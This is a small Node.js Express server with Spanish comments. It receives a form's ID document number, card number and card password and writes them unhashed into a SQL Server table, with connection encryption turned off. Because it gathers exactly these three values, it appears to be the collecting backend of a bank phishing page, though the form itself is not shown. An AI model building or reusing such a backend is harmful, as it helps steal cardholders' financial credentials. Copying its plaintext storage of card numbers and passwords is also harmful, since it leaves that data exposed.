// server.js
const express = require('express');
const bodyParser = require('body-parser');
const sql = require('mssql');

const app = express();
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Configuración de la conexión a SQL Server
const config = {
    user: '',
    password: '',
    server: 'DESKTOP-7LQ9NKM\SQLEXPRESS', // Cambia esto a tu servidor SQL
    database: 'tu_base_de_datos',
    options: {
        encrypt: false, // Utiliza true si estás en Azure
        trustServerCertificate: true // Cambia a false si no confías en el certificado del servidor
    }
};

// Ruta para manejar la recepción de los datos del formulario
app.post('/guardar-datos', (req, res) => {
    const { document, card, password } = req.body;

    sql.connect(config).then(pool => {
        return pool.request()
            .input('document', sql.VarChar, document)
            .input('card', sql.VarChar, card)
            .input('password', sql.VarChar, password)
            .query('INSERT INTO Usuarios (Documento, Tarjeta, Clave) VALUES (@document, @card, @password)');
    }).then(result => {
        res.send('Datos guardados exitosamente');
    }).catch(err => {
        console.error(err);
        res.status(500).send('Error al guardar los datos');
    });
});

app.listen(3000, () => {
    console.log('Servidor escuchando en el puerto 3000');
});
